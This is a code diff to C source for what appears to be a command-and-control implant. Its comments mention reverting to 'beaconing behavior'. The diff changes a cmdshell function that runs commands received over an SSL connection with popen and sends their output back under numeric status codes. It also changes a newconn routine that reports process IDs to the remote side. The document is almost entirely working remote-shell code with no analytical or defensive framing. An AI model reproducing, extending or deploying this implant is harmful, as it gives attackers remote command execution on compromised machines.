@@ -14,7 +14,7 @@ int newconn(SSL *ssl, pid_t *pids) {
   pid_t pid;
   char *env;
   char *pidstr;
-  char port[6];
+  char port[7];
   char addr[INET6_ADDRSTRLEN];
   uint8_t buf[4096] = {0};
 
@@ -40,7 +40,7 @@ int newconn(SSL *ssl, pid_t *pids) {
     fp = popen("pidof sbs", "r");
     fgets((char *)buf, sizeof(buf), fp);
     pidstr = strtok((char *)buf, " ");
-    if (ssl_writeall(ssl, (uint8_t *)pidstr, strlen(pidstr)+1) < 0) {
+    if (ssl_writeall(ssl, (uint8_t *)pidstr, 16) < 0) {
       // Do nothing so that we can still get the pids
     }
     for (size_t i = 0; i < 64; i++) {
@@ -61,11 +61,8 @@ int newconn(SSL *ssl, pid_t *pids) {
  * On socket errors the program will revert to beaconing behavior.
  */
 int cmdshell(SSL *ssl) {
-  //https://stackoverflow.com/questions/33884291/pipes-dup2-and-exec
-  //https://stackoverflow.com/questions/21558937/i-do-not-understand-how-execlp-works-in-linux
-  // Another option is looking at how I could do a pty and poll on the ssl descriptor and funnel traffic that way
   FILE *fp;
-  uint8_t buf[2048] = {0};
+  uint8_t buf[4096] = {0};
 
   fp = popen("date", "r");
   while (fgets((char *)buf, sizeof(buf), fp) != NULL) {
@@ -84,15 +81,20 @@ int cmdshell(SSL *ssl) {
     }
 
     if ((fp = popen((char *)buf, "r")) == NULL) {
-      if (ssl_writeall(ssl, (uint8_t *)"failed", 7) < 0) {return FAIL;}
+      if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
       continue;
     }
 
-    while(fgets((char *)buf, sizeof(buf), fp) != NULL) {
+    while(1) {
+      if (fgets((char *)buf, sizeof(buf), fp) == NULL && strlen((char *)buf) == 0) {
+        if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
+        break;
+      }
+      if (ssl_writeall(ssl, (uint8_t *)"102", 4) < 0) {return FAIL;}
       if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
+
       memset(buf, 0, sizeof(buf));
     }
-    if (ssl_writeall(ssl, (uint8_t *)"", 1) < 0) {return FAIL;}
 
     memset(buf, 0, sizeof(buf));
     pclose(fp);
